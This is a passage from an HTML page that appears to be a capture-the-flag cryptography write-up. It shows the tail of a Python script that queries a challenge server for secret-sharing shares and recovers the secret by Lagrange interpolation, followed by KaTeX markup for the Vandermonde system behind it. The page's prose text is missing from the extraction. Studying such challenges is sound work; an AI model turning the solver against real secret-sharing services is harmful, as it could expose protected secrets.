class="line">  shares = []</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">    x = <span class="built_in">pow</span>(g, i, p)</span><br><span class="line">    conn.sendline(<span class="built_in">str</span>(x).encode())</span><br><span class="line">    y = <span class="built_in">int</span>(conn.recvline())</span><br><span class="line">    shares.append((x, y))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">list</span>(R.lagrange_polynomial(shares))</span><br><span class="line"></span><br><span class="line">A = query()</span><br><span class="line">conn.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">conn.recvline()  <span class="comment"># :&lt;</span></span><br><span class="line"></span><br><span class="line">B = query()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> secret <span class="keyword">in</span> A:</span><br><span class="line">  <span class="keyword">if</span> secret <span class="keyword">in</span> B:</span><br><span class="line">    conn.sendline(<span class="built_in">str</span>(secret).encode())</span><br><span class="line">    <span class="built_in">print</span>(conn.recvline().decode().strip())</span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext></mrow><annotation encoding="application/x-tex"></annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mn>1</mn><mn>0</mn></msubsup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mn>1</mn><mn>1</mn></msubsup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em"></mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mn>1</mn><mrow><mi>t</mi><mo></mo><mn>1</mn></mrow></msubsup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mn>2</mn><mn>0</mn></msubsup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mn>2</mn><mn>1</mn></msubsup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em"></mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mn>2</mn><mrow><mi>t</mi><mo></mo><mn>1</mn></mrow></msubsup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal"></mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal"></mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em"></mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal"></mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mi>t</mi><mn>0</mn></msubsup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mi>t</mi><mn>1</mn></msubsup></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mo lspace="0em" rspace="0em"></mo></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msubsup><mi>x</mi><mi>t</mi><mrow><mi>t</mi><mo></mo><mn>1</mn></mrow></msubsup></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo></mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>c</mi><mn>0</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>c</mi><mn>1</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal"></mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>c</mi><mrow><mi>t</mi><mo></mo><mn>1</mn></mrow></msub></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mtext></mtext><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>1</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mn>2</mn></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi><mi mathvariant="normal"></mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>y</mi><mi>t</mi></msub></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\left [ \begin{matrix}x_1^0 &amp; x_1^1 &amp; \dots &amp; x_1^{t-1} \\x_2^0 &amp; x_2^1 &amp; \dots &amp; x_2^{t-1} \\\vdots &amp; \vdots &amp; \ddots &amp; \vdots \\x_t^0 &amp; x_t^1 &amp; \dots &amp; x_t^{t-1}\end{matrix} \right ]\cdot\left [ \begin{matrix}c_0 \\c_1 \\\vdots \\c_{t-1}\end{matrix} \right ]\ =\left [ \begin{matrix}y_1 \\y_2 \\\vdots \\y_t\end{matrix} \right ]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:5.502716999999999em;vertical-align:-2.5013584999999994em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.953995em;"><span style="top:-1.3499850000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-2.4999850000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.0959850000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.6919850000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.712975em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-4.953995em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:2.4500349999999997em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.0013584999999994em;"><span style="top:-5.8346195em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span></span></span><span style="top:-4.6203805000000004em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.7603804999999997em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord"></span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-1.5461415000000007em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:2.5013584999999994em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.0013584999999994em;"><span style="top:-5.8346195em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span></span></span><span style="top:-4.6203805000000004em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.7603804999999997em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord"></span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-1.5461415000000007em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:2.5013584999999994em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.0013584999999994em;"><span style="top:-5.6471195em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner"></span></span></span><span style="top:-4.4328805000000004em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner"></span></span></span><span style="top:-2.5728804999999997em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner"></span></span></span><span style="top:-1.3586415000000007em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"><span class="minner"></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:2.5013584999999994em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.0013584999999994em;"><span style="top:-5.8346195em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.854239em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1031310000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.266308em;"><span></span></span></span></span></span></span></span></span><span style="top:-4.6203805000000004em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.854239em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.1031310000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.266308em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.7603804999999997em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord"></span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-1.5461415000000007em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.854239em;"><span style="top:-2.454244em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.1031310000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.24575599999999997em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:2.5013584999999994em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.953995em;"><span style="top:-1.3499850000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-2.4999850000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.0959850000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.6919850000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.712975em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-4.953995em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:2.4500349999999997em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:5.459999999999999em;vertical-align:-2.4799999999999995em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.953995em;"><span style="top:-1.3499850000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-2.4999850000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.0959850000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.6919850000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.712975em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-4.953995em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:2.4500349999999997em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.9799999999999995em;"><span style="top:-5.8275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-4.6275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.7674999999999996em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord"></span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-1.5675000000000006em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:2.4799999999999995em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.953995em;"><span style="top:-1.3499850000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-2.4999850000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.0959850000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.6919850000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.712975em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-4.953995em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:2.4500349999999997em;"><span></span></span></span></span></span></span></span><span class="mspace"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:5.459999999999999em;vertical-align:-2.4799999999999995em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.953995em;"><span style="top:-1.3499850000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-2.4999850000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.0959850000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.6919850000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.712975em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-4.953995em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:2.4500349999999997em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.9799999999999995em;"><span style="top:-5.8275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-4.6275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.7674999999999996em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord"></span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-1.5675000000000006em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2805559999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:2.4799999999999995em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.953995em;"><span style="top:-1.3499850000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-2.4999850000000006em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.0959850000000007em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.6919850000000003em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-3.712975em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span><span style="top:-4.953995em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:2.4500349999999997em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo></mo><mi>c</mi><mo>=</mo><mi>b</mi><mtext></mtext><mi>A</mi><mtext></mtext><msub><mi>x</mi><mi>j</mi></msub><mtext></mtext><mi>c</mi></mrow><annotation encoding="application/x-tex">A\cdot c=bAx_{j}c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord mathnormal">b</span><span class="mord cjk_fallback"></span><span class="mord mathnormal">A</span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord 